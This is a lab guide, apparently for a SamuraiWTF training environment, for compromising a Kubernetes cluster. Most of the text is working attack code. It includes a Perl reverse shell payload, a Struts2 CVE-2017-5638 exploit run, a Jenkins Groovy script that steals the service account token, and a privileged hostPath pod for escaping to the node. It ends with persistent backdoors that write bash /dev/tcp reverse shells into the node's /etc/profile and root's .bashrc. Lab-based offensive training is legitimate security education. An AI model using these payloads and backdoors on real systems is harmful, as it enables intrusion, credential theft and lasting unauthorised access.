# Professionally Evil Container Hackery - k8s cluster lab guide

### Do this stuff to hack the k8s cluster
Sorry I will add more explanations soon!

#### 1. Open firefox and navigate to creditdataco.wtf:30080
#### 2. Compromise the app 
Open a terminal in the SamuraiWTF VM.

Set a perl reverse shell payload as an ENV VAR in your shell
```bash
read -r -d '' RSHELL << 'EOF'
use Socket;$i="10.0.2.15";$p=4445;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
EOF
```

Open another terminal and start a listner for out reverse shell:
```bash
nc -lvp 4445
```

From the samuraiwtf vm open a terminal and execute:
```bash
python .kube_cluster/S2-045.py creditdataco.wtf:30080 "perl -e \'$RSHELL\'"
```

This exploits the Struts2 app using cve-2017-5638 to give us command execution on the Struts2 app server.

**BOOM** Reverse shell 

#### 3. Now do your typical recon work but also add in the docker container recon stuff ;)
Oh and also do this in your reverse shell:
```bash
env
```

We now see a bunch of information there. This mostly describes other services within the k8s cluster.
Of interest here is

- `KUBERNETES_PORT=tcp://10.96.0.1:443`
- `JENKINS_SERVICE_PORT=tcp://10.110.112.164:8080`

This tells us a few things:

1. We're in a k8s cluster
2. The ip and port of the k8s master API server
3. That there is a service in the cluster that is exposing a Jenkins pod
4. The ip and port of the Jenkins service

#### 4. Let's try to steal the Jenkins service account JWT from inside the compromised struts pod container

We create a file containing a simple Groovy payload. This payload attempts to read the Jenkins pod's
service account JWT and return it to us.
```bash
cat << EOF > ./groovy.payload
def command = "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
def proc = command.execute()
proc.waitFor()
println "\${proc.in.text}"
EOF
```

Let's run our Jenkins exploit and see what happens:
```bash
T=`curl -d "script=$(cat groovy.payload)" -X POST http://10.110.112.164:8080/scriptText`
```

Check to see if it worked:
```bash
echo $T
```

If we got a JWT in that env var then our exploit worked.
We should now see what we can do with that Jenkins service account token. Since Jenkins is used 
as a part of CI/CD pipelines a lot, it might just have some pretty loose permissions tied to it!

#### 5. On your host maching get the kubectl binary
If it's already on your system then just make a copy of it and skip the next command.
```bash
curl -LO https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl
```
Let's compress and encode the kubectl binary:
```bash 
mkdir kube
mv kubectl kube/kube
tar -zcvf kube.tar.gz kube
cat kube.tar.gz | base64 > kube.tar.gz.b64
```

Now server the file up:
```bash
python -m SimpleHTTPServer [PORT] 
```

Back in the compromised struts pod 
Get the kubectl payload
```bash
curl http://<ATTACK_IP:PORT>/kube.tar.gz.b64
```
decode and extract the binary
```bash
cat kube.tar.gz.b64 | base64 -d > kube.tar.gz
tar -xjvf kube.tar.gz
mv kubectl_payload/kubectl ./kube
```
make it executable
```
chmod +x ./kube
```

Now let's test it out with out freshly stolen JWT :)
```
./kube --token=$T get pods
```

You should see something like the follwoing: 
```
NAME                       READY   STATUS    RESTARTS   AGE
jenkins-56dbd7c74b-qb8hs   1/1     Running   0          3d3h
struts-866b9dfb6c-cldbv    1/1     Running   0          3d3h
useless-pod                1/1     Running   0          3d3h
```

**It worked!** (the tool picked up the k8s api endpoint to use from the ENV variables we examined earlier)

Okay, so let's create a file containing a JSON payload which describes a new k8s pod.
```bash
cat << EOF > pod
{
	"apiVersion": "v1",
	"kind": "Pod",
	"metadata": {
		"name": "evilpod"
	},
	"spec": {
		"containers": [{
			"name": "evil-container",
			"image": "ubuntu:trusty",
			"command": [
                "sleep",
                "infinity"
			],
			"securityContext": {
				"privileged": true
			},
			"volumeMounts": [{
				"mountPath": "/mnt/host",
				"name": "evilvolume",
				"mountPropagation": "Bidirectional"
			}]
        }],
        "volumes": [{
			"name": "evilvolume",
			"hostPath": {
				"path": "/"
			}
		}]
	}
}
EOF
```
This pod will simply run the command `sleep infinity` and we will create a bidirectional bind volume which 
k8s will mount into the pod's containers. This volume mount will mount the cluster node to which the pod get's 
provisioned into the containers under `/mnt/host`.

Create our evil pod
```bash
./kube --token=$T apply -f pod
```
Check the pods status
```bash
./kube --token=$T get pods
```

Pivot into the new pod
```bash
./kube --token=$T exec -it evilpod /bin/bash
```

**BANG** We've just attached into the pod we created, time to escape to the host system!!

**NOTE:** It's here that you might want to do some more recon on what binaries are available in the host
mount with something like `ls /mnt/host/bin | grep "tool_you_wish_were_installed"`

Now we backdoor the host node with a bash reverse shell because why not (ymmv - use a reverse shell payload based on your recon)
```bash
# backdoor the host node's /etc/profile to run our shell when a login happens, hopefully we catch a root login ;)
echo "\$(bash -i >& /dev/tcp/10.0.2.15/4444 0>&1) &" >> /mnt/host/etc/profile
# OR if that doesn't work (maybe a non-login shell is started) we backdoor root users ~/.bashrc file
# Create it if it doesn't exist
touch /mnt/host/root/.bashrc
# set it to exec our perl reverse shell
echo "\$(bash -i >& /dev/tcp/10.0.2.15/4444 0>&1) &" > /mnt/host/root/.bashrc
```

Open another terminal on our host vm and listen for connect back
```bash
nc -lvp 4444
```

Now let's pretend that we are the cluster admin and we login into our node that happens to be compromised.
For the sake of demo we'll do this with docker from our host vm.
```bash
# simulate a cluster admin loging into the node as root
docker exec -it kind-control-plane /bin/bash
```

**WOW** we now have a shell on the cluster node, meaning we've escaped out of the cluster. 
BTW, kind-control-plane is the name of the container being used to simulate the k8s cluster master node :)

#### That's all! (for now)